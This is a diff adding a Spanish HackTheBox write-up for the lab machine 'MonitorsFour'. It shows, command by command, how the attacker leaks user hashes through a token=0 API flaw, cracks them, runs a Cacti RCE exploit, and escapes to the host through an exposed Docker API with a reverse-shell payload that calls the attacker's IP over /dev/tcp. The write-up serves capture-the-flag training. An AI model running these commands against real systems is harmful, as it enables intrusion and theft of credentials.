@@ -1,0 +1,326 @@
+---
+title: MonitorsFour
+featured: true
+lang: es
+image: ../../../../../images/writeups/hackthebox/monitors-four/monitors-four.png
+platform: htb
+difficulty: easy
+os: windows
+hints: []
+tags: [hackthebox, windows]
+parent: writeups/hackthebox/machines
+---
+
+<div style="display: flex; justify-content: center;">
+
+![Cap](@images/writeups/hackthebox/monitors-four/monitors-four.png)
+
+</div>
+
+<div style="text-align: center;">
+
+[https://app.hackthebox.com/machines/MonitorsFour](https://app.hackthebox.com/machines/MonitorsFour)
+
+</div>
+
+## Enumeration
+
+```bash
+sudo nmap -p- --min-rate 5000 -Pn -n -vv -oA nmap/MonitorsFour 10.129.13.151
+```
+
+```plaintext
+PORT     STATE SERVICE REASON
+80/tcp   open  http    syn-ack ttl 127
+5985/tcp open  wsman   syn-ack ttl 127
+```
+
+```bash
+nmap -p 80,5985 -sCV -oA nmap/openPorts 10.129.13.151
+```
+
+```plaintext
+PORT     STATE SERVICE VERSION
+80/tcp   open  http    nginx
+|_http-title: Did not follow redirect to http://monitorsfour.htb/
+5985/tcp open  http    Microsoft HTTPAPI httpd 2.0 (SSDP/UPnP)
+|_http-title: Not Found
+|_http-server-header: Microsoft-HTTPAPI/2.0
+Service Info: OS: Windows; CPE: cpe:/o:microsoft:windows
+```
+
+Agregar `monitorsfour.htb` al archivo `/etc/hosts`
+
+[http://monitorsfour.htb/](http://monitorsfour.htb/)
+
+![MonitorsFour Web](@images/writeups/hackthebox/monitors-four/monitors-four-web-80.png)
+
+```bash
+ffuf -w /usr/share/wordlists/seclists/Discovery/Web-Content/DirBuster-2007_directory-list-2.3-big.txt -u http://monitorsfour.htb/FUZZ -ic -c -t 100
+```
+
+```plaintext
+contact                 [Status: 200, Size: 367, Words: 34, Lines: 5, Duration: 207ms]
+login                   [Status: 200, Size: 4340, Words: 1342, Lines: 96, Duration: 253ms]
+user                    [Status: 200, Size: 35, Words: 3, Lines: 1, Duration: 179ms]
+static                  [Status: 301, Size: 162, Words: 5, Lines: 8, Duration: 154ms]
+views                   [Status: 301, Size: 162, Words: 5, Lines: 8, Duration: 160ms]
+forgot-password         [Status: 200, Size: 3099, Words: 164, Lines: 84, Duration: 951ms]
+```
+
+```bash
+curl -s http://monitorsfour.htb/user | jq
+```
+
+```json
+{
+  "error": "Missing token parameter"
+}
+```
+
+```bash
+curl -s http://monitorsfour.htb/user?token=melvin | jq
+```
+
+```json
+{
+  "error": "Invalid or missing token"
+}
+```
+
+```bash
+curl -s http://monitorsfour.htb/user?token=0 | jq
+```
+
+```json
+[
+  {
+    "id": 2,
+    "username": "admin",
+    "email": "admin@monitorsfour.htb",
+    "password": "56b32eb43e6f15395f6c46c1c9e1cd36",
+    "role": "super user",
+    "token": "8024b78f83f102da4f",
+    "name": "Marcus Higgins",
+    "position": "System Administrator",
+    "dob": "1978-04-26",
+    "start_date": "2021-01-12",
+    "salary": "320800.00"
+  },
+  {
+    "id": 5,
+    "username": "mwatson",
+    "email": "mwatson@monitorsfour.htb",
+    "password": "69196959c16b26ef00b77d82cf6eb169",
+    "role": "user",
+    "token": "0e543210987654321",
+    "name": "Michael Watson",
+    "position": "Website Administrator",
+    "dob": "1985-02-15",
+    "start_date": "2021-05-11",
+    "salary": "75000.00"
+  },
+  {
+    "id": 6,
+    "username": "janderson",
+    "email": "janderson@monitorsfour.htb",
+    "password": "2a22dcf99190c322d974c8df5ba3256b",
+    "role": "user",
+    "token": "0e999999999999999",
+    "name": "Jennifer Anderson",
+    "position": "Network Engineer",
+    "dob": "1990-07-16",
+    "start_date": "2021-06-20",
+    "salary": "68000.00"
+  },
+  {
+    "id": 7,
+    "username": "dthompson",
+    "email": "dthompson@monitorsfour.htb",
+    "password": "8d4a7e7fd08555133e056d9aacb1e519",
+    "role": "user",
+    "token": "0e111111111111111",
+    "name": "David Thompson",
+    "position": "Database Manager",
+    "dob": "1982-11-23",
+    "start_date": "2022-09-15",
+    "salary": "83000.00"
+  }
+]
+```
+
+```bash
+hashcat -m 0 admin_hash.txt /usr/share/wordlists/seclists/Passwords/Leaked-Databases/rockyou.txt
+```
+
+```plaintext
+56b32eb43e6f15395f6c46c1c9e1cd36:wonderful1
+```
+
+[http://monitorsfour.htb/login](http://monitorsfour.htb/login)
+
+<div style="display: flex; justify-content: center;">
+
+![MonitorsFour Web Login](@images/writeups/hackthebox/monitors-four/monitors-four-web-80-login.png)
+
+</div>
+
+[http://monitorsfour.htb/admin/dashboard](http://monitorsfour.htb/admin/dashboard)
+
+<div style="display: flex; justify-content: center;">
+
+![MonitorsFour Web Dashboard](@images/writeups/hackthebox/monitors-four/monitors-four-web-80-dashboard.png)
+
+</div>
+
+<div style="display: flex; justify-content: center;">
+
+![MonitorsFour Web Docker](@images/writeups/hackthebox/monitors-four/monitors-four-web-80-docker.png)
+
+</div>
+
+Docker Desktop 4.44.2
+
+Google `docker desktop 4.44.2 vulnerabilities`
+
+[Only TWO Lines of Code? Simple Docker Trick Gives Attackers Host Access](https://infosecwriteups.com/only-two-lines-of-code-simple-docker-trick-gives-attackers-host-access-a638293f43ad)
+
+```bash
+ffuf -w /usr/share/wordlists/seclists/Discovery/DNS/subdomains-top1million-110000.txt -u http://monitorsfour.htb -H 'Host: FUZZ.monitorsfour.htb' -ic -c -t 100 -fs 138
+```
+
+```plaintext
+cacti                   [Status: 302, Size: 0, Words: 1, Lines: 1, Duration: 165ms]
+```
+
+Agregar `cacti.monitorsfour.htb` al archivo `/etc/hosts`
+
+[http://cacti.monitorsfour.htb/cacti/](http://cacti.monitorsfour.htb/cacti/)
+
+<div style="display: flex; justify-content: center;">
+
+![Cacti Web](@images/writeups/hackthebox/monitors-four/monitors-four-web-cacti.png)
+
+</div>
+
+## Exploitation
+
+Google `cacti 1.2.28 vulnerabilities`
+
+[CVE-2025-24367 - Cacti Authenticated Graph Template RCE](https://github.com/TheCyberGeek/CVE-2025-24367-Cacti-PoC)
+
+[http://cacti.monitorsfour.htb/cacti/index.php](http://cacti.monitorsfour.htb/cacti/index.php)
+
+<div style="display: flex; justify-content: center;">
+
+![Cacti Web Login](@images/writeups/hackthebox/monitors-four/monitors-four-web-cacti-login.png)
+
+</div>
+
+Ponerse en escucha en la máquina atacante
+
+```bash
+nc -lnvp 1111
+```
+
+```bash
+sudo ./venv/bin/python3 exploit.py -u marcus -p wonderful1 -i 10.10.15.131 -l 1111 -url http://cacti.monitorsfour.htb
+```
+
+```plaintext
+[+] Cacti Instance Found!
+[+] Serving HTTP on port 80
+[+] Login Successful!
+[+] Got graph ID: 226
+[i] Created PHP filename: 6PQ9r.php
+[+] Got payload: /bash
+[i] Created PHP filename: 3up1N.php
+[+] Hit timeout, looks good for shell, check your listener!
+[+] Stopped HTTP server on port 80
+```
+
+```bash
+ls -R /home/
+```
+
+```plaintext
+/home/:
+marcus
+
+/home/marcus:
+user.txt
+```
+
+```bash
+cat /home/marcus/user.txt
+```
+
+### User flag
+
+<Callout type="success" title="USER FLAG">
+  a52**************************8aa
+</Callout>
+
+## Privilege Escalation
+
+```bash
+hostname
+```
+
+```plaintext
+821fbd6a43fa
+```
+
+Ponerse en escucha en la máquina atacante
+
+```bash
+nc -lnvp 2222
+```
+
+```bash
+curl -s -X POST http://192.168.65.7:2375/containers/create -H "Content-Type: application/json" -d'{"Image":"alpine" , "Cmd":["sh", "-c", "chroot /melvin /bin/bash -c \"bash -i >&/dev/tcp/10.10.15.131/2222 0>&1\""], "HostConfig":{"Binds": ["/:/melvin"],"Privileged":true}}' | tee melvin.json
+```
+
+```plaintext
+{"Id":"93b0940805a1f83f498c3f578199d28749215644b84ed409cc9fc3ba01c34530","Warnings":[]}
+```
+
+```bash
+id=$(cut -d'"' -f4 melvin.json)
+```
+
+```bash
+curl -s -X POST http://192.168.65.7:2375/containers/$id/start
+```
+
+```bash
+ls
+```
+
+```plaintext
+EFI   bpf-legacy.o  dev        home	      init   media		  mutagen-file-shares-mark  proc      run	src  tmp	  var
+bin   bpf.o	   dpkg.orig  host-network.o  lib    mnt		  opt			    pwatch.o  sbin	srv  udpv6csum.o
+boot  containers    etc        host_mnt        lib64  mutagen-file-shares  parent-distro	    root      services  sys  usr
+```
+
+```bash
+cd mnt/host/c/Users/Administrator/Desktop/
+```
+
+```bash
+ls
+```
+
+```plaintext
+desktop.ini  root.txt
+```
+
+```bash
+cat root.txt
+```
+
+### Root flag
+
+<Callout type="success" title="ROOT FLAG">
+  b2c**************************ed5
+</Callout>
